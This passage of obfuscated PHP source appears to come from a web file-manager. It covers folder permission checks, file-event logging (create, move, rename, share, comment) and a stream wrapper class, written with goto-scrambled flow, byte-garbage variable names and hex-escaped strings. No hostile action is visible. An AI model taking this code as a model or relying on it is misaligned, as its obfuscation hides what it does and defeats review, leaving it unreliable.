(empty($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[376]]) || isset($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[2273]]) && $Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[2273]]) { return $Eè®Ïá®Ωà; } if (AuthModel::authCheckRoot($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[376]][$F•àì˘ƒ≠◊[377]])) { return $Eè®Ïá®Ωà; } goto eŸÃûÒüÈ„; B•¢Â‡çí´: $aÇààÁØ¯Õ = array(); $f‡â‘ç¶‚· = array(); foreach ($fØΩ≥©∆∏ as $BæÂ√ÓÿØ≈ => $F¥úﬁñ–◊ç) { $C¯É£ÿç£¯ = $this->authFolderOwnerUser($F¥úﬁñ–◊ç); $aÇààÁØ¯Õ[$BæÂ√ÓÿØ≈] = $C¯É£ÿç£¯; $f‡â‘ç¶‚· = array_merge($f‡â‘ç¶‚·, $C¯É£ÿç£¯[$F•àì˘ƒ≠◊[535]]); if ($C¯É£ÿç£¯[$F•àì˘ƒ≠◊[2274]]) { break; } } goto CÍ»üÑ©ë≠; eŸÃûÒüÈ„: $E˘ÂÊ¨•¯· = Model($F•àì˘ƒ≠◊[1121])->parentLevelArray($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[459]]); $E˘ÂÊ¨•¯· = array_merge(array($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[369]]), array_reverse($E˘ÂÊ¨•¯·)); $Aúù’ ”ûä = $F•àì˘ƒ≠◊[2257]; goto c›∂„°ñ†; CÍ»üÑ©ë≠: if (count($f‡â‘ç¶‚·) == 0) { $f‡â‘ç¶‚· = $this->authFolderOwnerGroup($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[456]]); } $f‡â‘ç¶‚· = array_unique($f‡â‘ç¶‚·); if (AuthModel::authCheckRoot($Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[376]][$F•àì˘ƒ≠◊[377]])) { $f‡â‘ç¶‚·[] = USER_ID; } goto d—˜•∫î≤Í; c›∂„°ñ†: $DÂ £™√õ≠ = array($F•àì˘ƒ≠◊[383] => array($F•àì˘ƒ≠◊[384], $E˘ÂÊ¨•¯·)); $fØΩ≥©∆∏ = $this->field($Aúù’ ”ûä)->where($DÂ £™√õ≠)->select(); $fØΩ≥©∆∏ = array_to_keyvalue_group($fØΩ≥©∆∏, $F•àì˘ƒ≠◊[369]); goto B•¢Â‡çí´; eñÌù·÷åŸ: } private function authFolderOwnerGroup($A ìÚÎÇ¶€) { $FÕôÜÌú¯´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fòŸÍ·Üã— = Model($FÕôÜÌú¯´[2181])->where(array($FÕôÜÌú¯´[2106] => $A ìÚÎÇ¶€))->select(); $céÿÆÛÍâ· = array(); if (!$fòŸÍ·Üã—) { return $céÿÆÛÍâ·; } foreach ($fòŸÍ·Üã— as $C ∏Â÷™òÛ) { $bﬁƒçª“Â‰ = $this->authInfo($C ∏Â÷™òÛ); if (AuthModel::authCheckRoot($bﬁƒçª“Â‰[$FÕôÜÌú¯´[376]])) { $céÿÆÛÍâ·[] = $C ∏Â÷™òÛ[$FÕôÜÌú¯´[1438]]; } } return $céÿÆÛÍâ·; } private function authFolderOwnerUser($cªÁ›ª¿«∆) { $f¨´¡◊˘¢‡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b≤„ó≈êÑñ = array(); $Bì£©¢∏è¯ = !1; foreach ($cªÁ›ª¿«∆ as $A≈´Îê¢”è) { $a≤ıÊúﬂ¡ë = $this->authInfo($A≈´Îê¢”è); if ($A≈´Îê¢”è[$f¨´¡◊˘¢‡[456]] == $f¨´¡◊˘¢‡[468]) { $Bì£©¢∏è¯ = !0; } if ($A≈´Îê¢”è[$f¨´¡◊˘¢‡[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a≤ıÊúﬂ¡ë[$f¨´¡◊˘¢‡[376]])) { $b≤„ó≈êÑñ[] = $A≈´Îê¢”è[$f¨´¡◊˘¢‡[456]]; } } } return array($f¨´¡◊˘¢‡[535] => $b≤„ó≈êÑñ, $f¨´¡◊˘¢‡[2274] => $Bì£©¢∏è¯); } public function authMake($eÍƒ“´èﬁ‘) { goto Eá¨àº∞÷Ω; bù≤ Úº≤à: $E◊€√÷ÔíÏ = $Fù¬ÛÃÀ»® ? $FŒûûÂûﬁû : ($eåÓñ‹˘≈¶ ? $f“ºÉäÉΩõ : $BÖ≤“¶Â⁄ã); $c≠∂ï·∂ÁÇ = $Fù¬ÛÃÀ»® ? $AÖÖÌ¬ò®Ì : ($eåÓñ‹˘≈¶ ? $AÚ£ô≈Âè™ : $CÎ–¨ﬁ¿ÚÏ); $aá— ∑“îÌ = $Fù¬ÛÃÀ»® ? $cßëà¬†´Ú[2276] : ($eåÓñ‹˘≈¶ ? $cßëà¬†´Ú[2277] : ($F ≈ãÁì’ë ? $cßëà¬†´Ú[2278] : $cßëà¬†´Ú[361])); goto cã¶Æë“π ; bº»É–·„ë: $F ≈ãÁì’ë = 0; $b¶áÏﬁ€Ù˘ = array($cßëà¬†´Ú[369] => 0); foreach ($eÍƒ“´èﬁ‘ as $b¶áÏﬁ€Ù˘) { $c≠∂ï·∂ÁÇ = $this->authInfo($b¶áÏﬁ€Ù˘); $Bô‡ÈÈèÿâ = $b¶áÏﬁ€Ù˘[$cßëà¬†´Ú[456]]; $a≥ëâ˜ó¨Ô = intval($c≠∂ï·∂ÁÇ[$cßëà¬†´Ú[376]]); if ($b¶áÏﬁ€Ù˘[$cßëà¬†´Ú[371]] == SourceModel::TYPE_USER && $Bô‡ÈÈèÿâ == USER_ID) { $Fù¬ÛÃÀ»® = !0; $AÖÖÌ¬ò®Ì = $c≠∂ï·∂ÁÇ; $FŒûûÂûﬁû = $a≥ëâ˜ó¨Ô; } else { if ($b¶áÏﬁ€Ù˘[$cßëà¬†´Ú[371]] == SourceModel::TYPE_GROUP && in_array($Bô‡ÈÈèÿâ, $e≈“ªé¨≤œ)) { $eåÓñ‹˘≈¶ = !0; if ($a≥ëâ˜ó¨Ô >= $f“ºÉäÉΩõ) { $f“ºÉäÉΩõ = $a≥ëâ˜ó¨Ô; $AÚ£ô≈Âè™ = $c≠∂ï·∂ÁÇ; } } else { if ($Bô‡ÈÈèÿâ == $cßëà¬†´Ú[468]) { $F ≈ãÁì’ë = !0; $CÎ–¨ﬁ¿ÚÏ = $c≠∂ï·∂ÁÇ; $BÖ≤“¶Â⁄ã = $a≥ëâ˜ó¨Ô; } } } } goto bù≤ Úº≤à; Eá¨àº∞÷Ω: $cßëà¬†´Ú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$eÍƒ“´èﬁ‘) { return array($cßëà¬†´Ú[377] => 0, $cßëà¬†´Ú[418] => !1); } $CüëîÙƒ´¶ = Session::get($cßëà¬†´Ú[2219]); goto D ëÑçå‡ú; cã¶Æë“π : $e°»ﬂÏà¬œ = array($cßëà¬†´Ú[2267] => intval($E◊€√÷ÔíÏ), $cßëà¬†´Ú[2268] => $c≠∂ï·∂ÁÇ, $cßëà¬†´Ú[2262] => array($cßëà¬†´Ú[388] => $aá— ∑“îÌ, $cßëà¬†´Ú[75] => $b¶áÏﬁ€Ù˘[$cßëà¬†´Ú[369]])); return $e°»ﬂÏà¬œ; goto FÏÓ·ç‚ùÂ; eà÷‡–àé: $CÎ–¨ﬁ¿ÚÏ = 0; $Fù¬ÛÃÀ»® = 0; $eåÓñ‹˘≈¶ = 0; goto bº»É–·„ë; Fçƒ≈∏ùòû: $BÖ≤“¶Â⁄ã = 0; $AÖÖÌ¬ò®Ì = 0; $AÚ£ô≈Âè™ = 0; goto eà÷‡–àé; D ëÑçå‡ú: $e≈“ªé¨≤œ = array_to_keyvalue($CüëîÙƒ´¶, $cßëà¬†´Ú[33], $cßëà¬†´Ú[2106]); $FŒûûÂûﬁû = 0; $f“ºÉäÉΩõ = 0; goto Fçƒ≈∏ùòû; FÏÓ·ç‚ùÂ: } public function authTargetInfoMake($E ÌÜ∑Ùì›) { goto a´∑íµÀÑŒ; a´∑íµÀÑŒ: $f™ì¬âí†Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a–√à—®ªß = array(); $D˜ô°≠ÖÍß = array(); goto aß»ËÂæÔÖ; aß»ËÂæÔÖ: foreach ($E ÌÜ∑Ùì› as $c®ŒÜÌè«◊) { if ($c®ŒÜÌè«◊[$f™ì¬âí†Ü[371]] == SourceModel::TYPE_USER) { $a–√à—®ªß[] = intval($c®ŒÜÌè«◊[$f™ì¬âí†Ü[456]]); } else { if ($c®ŒÜÌè«◊[$f™ì¬âí†Ü[371]] == SourceModel::TYPE_GROUP) { $D˜ô°≠ÖÍß[] = intval($c®ŒÜÌè«◊[$f™ì¬âí†Ü[456]]); } } } if ($a–√à—®ªß) { $a–√à—®ªß = Model($f™ì¬âí†Ü[474])->userListInfo($a–√à—®ªß); } if ($D˜ô°≠ÖÍß) { $fƒûõ—™æÉ = array($f™ì¬âí†Ü[2179] => array($f™ì¬âí†Ü[384], $D˜ô°≠ÖÍß)); $D˜ô°≠ÖÍß = Model($f™ì¬âí†Ü[458])->field($f™ì¬âí†Ü[2192])->where($fƒûõ—™æÉ)->select(); $D˜ô°≠ÖÍß = array_to_keyvalue($D˜ô°≠ÖÍß, $f™ì¬âí†Ü[2106]); } goto d∂á´¶øÂ; d∂á´¶øÂ: return array($f™ì¬âí†Ü[2279] => $a–√à—®ªß, $f™ì¬âí†Ü[2271] => $D˜ô°≠ÖÍß); goto C¬íØÖüä¯; C¬íØÖüä¯: } private function authInfo($CÂØ«í—Ó ) { $dà˘ı¬´öÚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($CÂØ«í—Ó [$dà˘ı¬´öÚ[2235]]) { $fºΩ◊⁄…Ìœ = Model($dà˘ı¬´öÚ[2254])->listData($CÂØ«í—Ó [$dà˘ı¬´öÚ[2235]]); if (!$fºΩ◊⁄…Ìœ) { return !1; $bÜ•ÿﬁ”∫Í = Model($dà˘ı¬´öÚ[2254])->listData(); $b °È’“Ô = array_filter_by_field($bÜ•ÿﬁ”∫Í, $dà˘ı¬´öÚ[376], $dà˘ı¬´öÚ[468]); return $b °È’“Ô; } $AÏáîë•‹≠ = array_field_key($fºΩ◊⁄…Ìœ, array($dà˘ı¬´öÚ[367], $dà˘ı¬´öÚ[28], $dà˘ı¬´öÚ[376], $dà˘ı¬´öÚ[2124], $dà˘ı¬´öÚ[2127])); $AÏáîë•‹≠[$dà˘ı¬´öÚ[2280]] = $CÂØ«í—Ó ; return $AÏáîë•‹≠; } else { return array($dà˘ı¬´öÚ[385] => 0, $dà˘ı¬´öÚ[2112] => $CÂØ«í—Ó [$dà˘ı¬´öÚ[2236]], $dà˘ı¬´öÚ[386] => $dà˘ı¬´öÚ[33], $dà˘ı¬´öÚ[2124] => $dà˘ı¬´öÚ[2281]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\145\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\x75\156\143\164\x69\x6f\156"), array("\144\145\163\x63", '', "\151\x6e\163\x65\x72\164\54\165\160\x64\141\x74\x65\54\x73\x65\x6c\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($eπ≥®€Û˜¢, $fêºæ≈ƒ‹À, $f∫åã ‘‹∫ = '') { goto Fµ⁄ÕÈª›Õ; f‹íâÈ©∫ : $e—÷éüÌä™ = array($Eπ°Ú“®◊È[383] => $eπ≥®€Û˜¢, $Eπ°Ú“®◊È[2282] => $B°ÙéÍÉÓ¯[$Eπ°Ú“®◊È[461]], $Eπ°Ú“®◊È[2283] => $B°ÙéÍÉÓ¯[$Eπ°Ú“®◊È[28]], $Eπ°Ú“®◊È[466] => $B°ÙéÍÉÓ¯[$Eπ°Ú“®◊È[466]], $Eπ°Ú“®◊È[1429] => USER_ID, $Eπ°Ú“®◊È[388] => $fêºæ≈ƒ‹À, $Eπ°Ú“®◊È[1431] => $f∫åã ‘‹∫); $this->addSystemLog($fêºæ≈ƒ‹À, $e—÷éüÌä™); return $this->add($e—÷éüÌä™); goto FÇ“øÛ‚Î≈; e·Ÿçµ‚‰Ë: if (!$B°ÙéÍÉÓ¯) { return !1; } if ($this->isCacheEvent($B°ÙéÍÉÓ¯, $fêºæ≈ƒ‹À)) { return; } if ($f∫åã ‘‹∫ && is_string($f∫åã ‘‹∫)) { $f∫åã ‘‹∫ = array($Eπ°Ú“®◊È[2137] => $f∫åã ‘‹∫); } goto f‹íâÈ©∫ ; Fµ⁄ÕÈª›Õ: $Eπ°Ú“®◊È =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->eventSave) { return; } $B°ÙéÍÉÓ¯ = Model($Eπ°Ú“®◊È[1121])->sourceInfo($eπ≥®€Û˜¢); goto e·Ÿçµ‚‰Ë; FÇ“øÛ‚Î≈: } private function addSystemLog($Fì£Ë”»©Û, $bçà√·∫ÕÆ) { $aﬁ„ÁÉπáÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Fì£Ë”»©Û == $aﬁ„ÁÉπáÁ[2284]) { $Fì£Ë”»©Û = $bçà√·∫ÕÆ[$aﬁ„ÁÉπáÁ[405]][$aﬁ„ÁÉπáÁ[2285]]; } else { if (in_array($Fì£Ë”»©Û, array($aﬁ„ÁÉπáÁ[2083], $aﬁ„ÁÉπáÁ[2286]))) { $Fì£Ë”»©Û = $bçà√·∫ÕÆ[$aﬁ„ÁÉπáÁ[405]][$aﬁ„ÁÉπáÁ[692]]; } } $f›ëÜ´ªèÊ = array_merge($bçà√·∫ÕÆ, array($aﬁ„ÁÉπáÁ[2287] => $bçà√·∫ÕÆ[$aﬁ„ÁÉπáÁ[369]], $aﬁ„ÁÉπáÁ[2288] => $bçà√·∫ÕÆ[$aﬁ„ÁÉπáÁ[2288]])); Model($aﬁ„ÁÉπáÁ[2046])->addLog($aﬁ„ÁÉπáÁ[2289] . $Fì£Ë”»©Û, $f›ëÜ´ªèÊ); } private function isCacheEvent($Aïçÿ‰∂è˘, $FùúåÚäõ) { if ($Aïçÿ‰∂è˘[$_SERVER[Ä¿¡‡öóµŸﬂ‡][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($EÏØ⁄÷ÁõÔ, $cˆâÏºè’Ω) { $B∂ÛÈÜóœ† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÏ∏Á‘Œ÷π = Model($B∂ÛÈÜóœ†[1121])->sourceInfo($EÏØ⁄÷ÁõÔ); $b”¬ıÉâ–Î = array($B∂ÛÈÜóœ†[2285] => $cˆâÏºè’Ω, $B∂ÛÈÜóœ†[28] => $CÏ∏Á‘Œ÷π[$B∂ÛÈÜóœ†[28]]); return $this->addEvent($EÏØ⁄÷ÁõÔ, $B∂ÛÈÜóœ†[2284], $b”¬ıÉâ–Î); } public function eventFileEdit($b Éˆê¿ø÷) { $e≈§ªÜŸèª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÒê√®ıÜ” = array($e≈§ªÜŸèª[2290] => $_SERVER[$e≈§ªÜŸèª[2291]], $e≈§ªÜŸèª[1752] => strtolower(ACTION)); return $this->addEvent($b Éˆê¿ø÷, $e≈§ªÜŸèª[2073], $BÒê√®ıÜ”); } public function eventRecycle($f§◊Òàå¥Â, $cÓÉ˜•ââ‰) { return $this->addEvent($f§◊Òàå¥Â, $_SERVER[Ä¿¡‡öóµŸﬂ‡][2286], $cÓÉ˜•ââ‰); } public function eventRemove($få∂‡ÿ—©Ü) { $E∆ã≥°ÏÀø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eä±ã…˜ë∆ = Model($E∆ã≥°ÏÀø[1121])->sourceInfo($få∂‡ÿ—©Ü); $Cö™‹â©Ó∞ = $Eä±ã…˜ë∆[$E∆ã≥°ÏÀø[28]]; return $this->addEvent($Eä±ã…˜ë∆[$E∆ã≥°ÏÀø[461]], $E∆ã≥°ÏÀø[2072], $Cö™‹â©Ó∞); } public function eventShare($eòÑøåÖ¯œ, $A∏í–¿¥›◊) { return $this->addEvent($eòÑøåÖ¯œ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][2083], $A∏í–¿¥›◊); } public function eventMove($Füëÿ¿ˆˆë, $Eûõë‹ŒÂı, $AãÂÛãù ï) { goto eÕí∆í‘ÔÓ; A≥øﬂÉ÷¡ù: $this->addEvent($Eûõë‹ŒÂı, $Eﬂ‹ı¶«¢›[2296], $EŒèê’€´Ù); goto bøÓ†¯‰ùÏ; e∆èÕ–Á˜ñ: $C†∆ç‘àÌæ = $Fã√º§Ÿêπ->sourceInfo($Eûõë‹ŒÂı); $f¶œº°™÷ú = $Fã√º§Ÿêπ->sourceInfo($AãÂÛãù ï); $EŒèê’€´Ù = array($Eﬂ‹ı¶«¢›[1011] => $Eûõë‹ŒÂı, $Eﬂ‹ı¶«¢›[2292] => $C†∆ç‘àÌæ[$Eﬂ‹ı¶«¢›[28]], $Eﬂ‹ı¶«¢›[2293] => $C†∆ç‘àÌæ[$Eﬂ‹ı¶«¢›[466]], $Eﬂ‹ı¶«¢›[1012] => $AãÂÛãù ï, $Eﬂ‹ı¶«¢›[2294] => $f¶œº°™÷ú[$Eﬂ‹ı¶«¢›[28]], $Eﬂ‹ı¶«¢›[2295] => $f¶œº°™÷ú[$Eﬂ‹ı¶«¢›[466]]); goto A±á›ﬂÉéË; eÕí∆í‘ÔÓ: $Eﬂ‹ı¶«¢› =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fã√º§Ÿêπ = Model($Eﬂ‹ı¶«¢›[1121]); $a›ëµ˜ÑÎÒ = $Fã√º§Ÿêπ->sourceInfo($Füëÿ¿ˆˆë); goto e∆èÕ–Á˜ñ; A±á›ﬂÉéË: $this->addEvent($Füëÿ¿ˆˆë, $Eﬂ‹ı¶«¢›[492], $EŒèê’€´Ù); $a›ëµ˜ÑÎÒ = $Fã√º§Ÿêπ->sourceInfo($Füëÿ¿ˆˆë); $EŒèê’€´Ù = array($Eﬂ‹ı¶«¢›[369] => $a›ëµ˜ÑÎÒ[$Eﬂ‹ı¶«¢›[369]], $Eﬂ‹ı¶«¢›[28] => $a›ëµ˜ÑÎÒ[$Eﬂ‹ı¶«¢›[28]]); goto A≥øﬂÉ÷¡ù; bøÓ†¯‰ùÏ: } public function eventCopy($fèÒ∞ßû˜Â) { $this->eventCreate($fèÒ∞ßû˜Â, $_SERVER[Ä¿¡‡öóµŸﬂ‡][490]); } public function eventRename($cÏç¥µñö‘, $fÖõÎÍâÍÍ, $E„‡Æöèî‹) { $c—ë£¯àÜº =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C¯ã®À”ºÁ = array($c—ë£¯àÜº[1011] => $fÖõÎÍâÍÍ, $c—ë£¯àÜº[1012] => $E„‡Æöèî‹); return $this->addEvent($cÏç¥µñö‘, $c—ë£¯àÜº[1133], $C¯ã®À”ºÁ); } public function eventAddComment($C∂∫úúœ ¿, $f˘Öü≤öÊ ) { return $this->addEvent($C∂∫úúœ ¿, $_SERVER[Ä¿¡‡öóµŸﬂ‡][2297], $f˘Öü≤öÊ ); } public function eventAddDesc($c≠ëàÔ∑ï‰, $D≠”◊Ô¡ªÑ) { return $this->addEvent($c≠ëàÔ∑ï‰, $_SERVER[Ä¿¡‡öóµŸﬂ‡][2298], $D≠”◊Ô¡ªÑ); } public function listBySource($E≤ü˜Ñ≤¿Æ) { goto A»Û¨∂ïº«; A»Û¨∂ïº«: $cŒ™û”ä“≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C∏ßÒÛâ€ú = Model($cŒ™û”ä“≤[1121])->sourceInfo($E≤ü˜Ñ≤¿Æ); $eª°¥≠áﬂê = array($cŒ™û”ä“≤[383] => $E≤ü˜Ñ≤¿Æ); goto d¶ß∂å®¶¡; d¶ß∂å®¶¡: if ($C∏ßÒÛâ€ú[$cŒ™û”ä“≤[370]] == $cŒ™û”ä“≤[83]) { $dÜ®â‚–·» = Model($cŒ™û”ä“≤[1121])->listSearchChildren($E≤ü˜Ñ≤¿Æ, 20000); $dÜ®â‚–·»[] = $E≤ü˜Ñ≤¿Æ . $cŒ™û”ä“≤[361]; $eª°¥≠áﬂê = array($cŒ™û”ä“≤[369] => array($cŒ™û”ä“≤[7], $dÜ®â‚–·»)); } $c€Í¡å™ÚÖ = $this->where($eª°¥≠áﬂê)->order($cŒ™û”ä“≤[2299])->selectPage(); if ($c€Í¡å™ÚÖ[$cŒ™û”ä“≤[351]][$cŒ™û”ä“≤[352]] == 0) { $c€Í¡å™ÚÖ[$cŒ™û”ä“≤[351]][$cŒ™û”ä“≤[352]] = 1; $c€Í¡å™ÚÖ[$cŒ™û”ä“≤[354]] = array(array($cŒ™û”ä“≤[383] => $E≤ü˜Ñ≤¿Æ, $cŒ™û”ä“≤[2282] => $C∏ßÒÛâ€ú[$cŒ™û”ä“≤[461]], $cŒ™û”ä“≤[1429] => $C∏ßÒÛâ€ú[$cŒ™û”ä“≤[378]], $cŒ™û”ä“≤[388] => $cŒ™û”ä“≤[2300], $cŒ™û”ä“≤[389] => $C∏ßÒÛâ€ú[$cŒ™û”ä“≤[187]], $cŒ™û”ä“≤[1431] => $cŒ™û”ä“≤[33])); } goto AÒÏÈ˜òëÇ; AÒÏÈ˜òëÇ: return $this->eventListParse($c€Í¡å™ÚÖ, $E≤ü˜Ñ≤¿Æ); goto b≠·⁄¡Ñ˜; b≠·⁄¡Ñ˜: } private function eventListParse($BºàüÌ⁄‰ï, $Cä’Ÿë‘Ø≈) { goto Bá‰û≈∆§Ù; F˜÷∑ÌªëÉ: $e˘†≤Ó√≠õ = array_unique($e˘†≤Ó√≠õ); $c¡∞êúéÉç = array_unique(array_to_keyvalue($D°Ö—öÚ–∞, $aÎ”îœÊ„é[33], $aÎ”îœÊ„é[1438])); $DÖÒ´É¢®À = Model($aÎ”îœÊ„é[477])->userListInfo($c¡∞êúéÉç); goto EœÆ∑¢∂õ∫; Bá‰û≈∆§Ù: $aÎ”îœÊ„é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D°Ö—öÚ–∞ = $BºàüÌ⁄‰ï[$aÎ”îœÊ„é[354]]; $e˘†≤Ó√≠õ = array_to_keyvalue($D°Ö—öÚ–∞, $aÎ”îœÊ„é[33], $aÎ”îœÊ„é[369]); goto F£÷û⁄∏Üÿ; F£÷û⁄∏Üÿ: $d⁄Ó°ä—◊ò = array_to_keyvalue($D°Ö—öÚ–∞, $aÎ”îœÊ„é[33], $aÎ”îœÊ„é[2288]); foreach ($D°Ö—öÚ–∞ as $D¡áîÌíá™) { $C¶ŸÊ÷äÓ√ = $D¡áîÌíá™[$aÎ”îœÊ„é[405]]; if ($D¡áîÌíá™[$aÎ”îœÊ„é[29]] == $aÎ”îœÊ„é[492] && isset($C¶ŸÊ÷äÓ√[$aÎ”îœÊ„é[1011]])) { $e˘†≤Ó√≠õ[] = $C¶ŸÊ÷äÓ√[$aÎ”îœÊ„é[1011]] . $aÎ”îœÊ„é[33]; $e˘†≤Ó√≠õ[] = $C¶ŸÊ÷äÓ√[$aÎ”îœÊ„é[1012]] . $aÎ”îœÊ„é[33]; } if ($D¡áîÌíá™[$aÎ”îœÊ„é[29]] == $aÎ”îœÊ„é[2296] && isset($C¶ŸÊ÷äÓ√[$aÎ”îœÊ„é[369]])) { $e˘†≤Ó√≠õ[] = $C¶ŸÊ÷äÓ√[$aÎ”îœÊ„é[369]] . $aÎ”îœÊ„é[33]; } } $e˘†≤Ó√≠õ = array_merge($e˘†≤Ó√≠õ, $d⁄Ó°ä—◊ò, array($Cä’Ÿë‘Ø≈ . $aÎ”îœÊ„é[33])); goto F˜÷∑ÌªëÉ; EœÆ∑¢∂õ∫: $b∞ì÷Î·ûí = Model($aÎ”îœÊ„é[761])->sourceListInfo($e˘†≤Ó√≠õ, !0); foreach ($D°Ö—öÚ–∞ as &$D¡áîÌíá™) { if ($D¡áîÌíá™[$aÎ”îœÊ„é[29]] == $aÎ”îœÊ„é[492] && isset($D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[1011]])) { $D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[1011]] = $b∞ì÷Î·ûí[$D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[1011]]]; $D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[1012]] = $b∞ì÷Î·ûí[$D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[1012]]]; } if ($D¡áîÌíá™[$aÎ”îœÊ„é[29]] == $aÎ”îœÊ„é[2296] && isset($D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[369]])) { $D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[369]] = $b∞ì÷Î·ûí[$D¡áîÌíá™[$aÎ”îœÊ„é[405]][$aÎ”îœÊ„é[369]]]; } $D¡áîÌíá™[$aÎ”îœÊ„é[391]] = $b∞ì÷Î·ûí[$D¡áîÌíá™[$aÎ”îœÊ„é[369]]]; $D¡áîÌíá™[$aÎ”îœÊ„é[2301]] = $b∞ì÷Î·ûí[$D¡áîÌíá™[$aÎ”îœÊ„é[2288]]]; if ($D¡áîÌíá™[$aÎ”îœÊ„é[29]] == $aÎ”îœÊ„é[2072]) { $D¡áîÌíá™[$aÎ”îœÊ„é[2301]] = $D¡áîÌíá™[$aÎ”îœÊ„é[391]]; $D¡áîÌíá™[$aÎ”îœÊ„é[2288]] = $D¡áîÌíá™[$aÎ”îœÊ„é[2301]][$aÎ”îœÊ„é[369]]; $D¡áîÌíá™[$aÎ”îœÊ„é[391]] = !1; $D¡áîÌíá™[$aÎ”îœÊ„é[369]] = $aÎ”îœÊ„é[33]; } $D¡áîÌíá™[$aÎ”îœÊ„é[2244]] = $DÖÒ´É¢®À[$D¡áîÌíá™[$aÎ”îœÊ„é[1438]]]; } $BºàüÌ⁄‰ï[$aÎ”îœÊ„é[354]] = $D°Ö—öÚ–∞; goto BÕ–ÿñ‘˘∏; BÕ–ÿñ‘˘∏: return $BºàüÌ⁄‰ï; goto C ≥≥Ã ≠®; C ≥≥Ã ≠®: } public function removeBySource($Dö†ÉñÜÔ∑) { $Còù∫÷åàÛ = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][383] => $Dö†ÉñÜÔ∑); $this->where($Còù∫÷åàÛ)->remove(); } } goto eéç…Á»”È; D¥Ç¨Àô◊∞: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F°†•Â¿»û, $açµçò˘≈ú = '') { goto f’èŒâ°»…; FÁâ´åŒΩù: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$F°†•Â¿»û])) { self::$_chunkBuffer[$F°†•Â¿»û] = array(); } goto EùâèñÚÒú; f’èŒâ°»…: $this->info = $this->info($F°†•Â¿»û); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]; goto FÁâ´åŒΩù; EùâèñÚÒú: return $this->info ? !0 : !1; goto E–óõÁÇ€Ù; E–óõÁÇ€Ù: } function stream_read($E∏ÀÜöøòñ) { $Eÿ°‹Èä¥± = $this->fileSubstr($this->pose, $E∏ÀÜöøòñ); $this->pose += strlen($Eÿ°‹Èä¥±); return $Eÿ°‹Èä¥±; } public function stream_tell() { return $this->pose; } public function stream_seek($cû‹œÇé, $Aïøüƒ¡œÚ) { $Fæ·©ÀÜ¥ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Aïøüƒ¡œÚ == SEEK_SET) { $this->pose = $cû‹œÇé; } else { if ($Aïøüƒ¡œÚ == SEEK_CUR) { $this->pose += $cû‹œÇé; } else { if ($Aïøüƒ¡œÚ == SEEK_END) { $this->pose = $this->info[$Fæ·©ÀÜ¥ö[77]] + intval($cû‹œÇé); } } } if ($cû‹œÇé < 0) { $this->pose = $this->info[$Fæ·©ÀÜ¥ö[77]] + $cû‹œÇé; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]; } public function stream_close() { return !0; } public function url_stat($F◊‘–ª€ı«, $b§ ©¥ÉòÆ) { $c›ÿÏàÀŸÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÑ¿ …ÂÉá = $this->info($F◊‘–ª€ı«); return array($c›ÿÏàÀŸÖ[1293] => 0, $c›ÿÏàÀŸÖ[1294] => 0, $c›ÿÏàÀŸÖ[12] => 32768 + 511, $c›ÿÏàÀŸÖ[1295] => 0, $c›ÿÏàÀŸÖ[1296] => 0, $c›ÿÏàÀŸÖ[1297] => 0, $c›ÿÏàÀŸÖ[1298] => 0, $c›ÿÏàÀŸÖ[77] => $dÑ¿ …ÂÉá[$c›ÿÏàÀŸÖ[77]], $c›ÿÏàÀŸÖ[1299] => $dÑ¿ …ÂÉá[$c›ÿÏàÀŸÖ[1171]], $c›ÿÏàÀŸÖ[1257] => $dÑ¿ …ÂÉá[$c›ÿÏàÀŸÖ[107]], $c›ÿÏàÀŸÖ[1256] => $dÑ¿ …ÂÉá[$c›ÿÏàÀŸÖ[187]], 